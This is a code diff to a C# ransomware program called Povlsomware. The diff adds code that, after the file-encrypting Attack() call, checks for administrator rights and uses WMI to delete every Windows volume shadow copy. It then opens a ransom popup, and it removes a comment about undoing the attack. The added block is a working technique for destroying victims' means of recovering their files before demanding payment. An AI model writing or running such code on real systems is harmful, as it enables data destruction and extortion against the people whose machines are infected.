@@ -1,9 +1,12 @@
-﻿using System;
+using System;
 using System.Text;
 using System.Security.Cryptography;
 using System.IO;
 using System.Linq;
 using System.Collections.Generic;
+using System.Diagnostics;
+using System.Security.Principal;
+using System.Management;
 
 namespace Povlsomware
 {
@@ -14,9 +17,29 @@ namespace Povlsomware
         static void Main(string[] args)
         {
             //Start the attack
+
             Attack();
 
-            //Undo the attack
+            bool isElevated;
+            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
+            {
+                WindowsPrincipal principal = new WindowsPrincipal(identity);
+                isElevated = principal.IsInRole(WindowsBuiltInRole.Administrator);
+            }
+            if (isElevated)
+            {
+                string NamespacePath = "\\\\.\\ROOT\\cimv2";
+                string ClassName = "Win32_ShadowCopy";
+                //Create ManagementClass
+                ManagementClass oClass = new ManagementClass(NamespacePath + ":" + ClassName);
+
+                //Get all instances of the class and enumerate them
+                foreach (ManagementObject oObject in oClass.GetInstances())
+                {
+                    //access a property of the Management object
+                    oObject.Delete();
+                }
+            }
             //Creates a popup that lets you view the encrypted files and add the password
             PayM3 thx = new PayM3();
             System.Windows.Forms.Application.Run(thx);
